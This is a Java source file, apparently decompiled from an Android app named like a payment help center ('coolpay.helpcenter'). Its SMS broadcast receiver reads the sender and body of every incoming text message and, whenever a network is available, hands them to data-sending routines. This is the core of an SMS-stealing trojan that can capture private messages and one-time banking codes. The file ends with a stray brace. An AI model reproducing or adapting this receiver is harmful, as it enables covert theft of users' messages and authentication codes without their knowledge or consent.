package com.coolpay.helpcenter;

import android.annotation.TargetApi;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class MySmsReceiver extends BroadcastReceiver {
    public static final String pdu_type = "pdus";

    public void onReceive(Context context, Intent intent) {
        int i = 0;
        boolean isNetworkAvailable = NetworkUtils.isNetworkAvailable(context);
        boolean isWifiAvailable = NetworkUtils.isWifiAvailable(context);
        Bundle extras = intent.getExtras();
        String str = "";
        String str2 = "";
        String string = extras.getString("format");
        Object[] objArr = (Object[]) extras.get(pdu_type);
        if (objArr != null) {
            boolean z = Build.VERSION.SDK_INT >= 23;
            SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
            while (i < smsMessageArr.length) {
                if (z) {
                    smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i], string);
                } else {
                    smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                }
                str = smsMessageArr[i].getOriginatingAddress();
                str2 = String.valueOf(str2) + smsMessageArr[i].getMessageBody() + "\n";
                i++;
            }
            if (isNetworkAvailable || isWifiAvailable) {
                new SendData(context);
                new SendDataNotification(context);
                SendData.sendData(str2, str);
                SendDataNotification.sendDataNotification(str2, str);
            }
        }
    }

        }
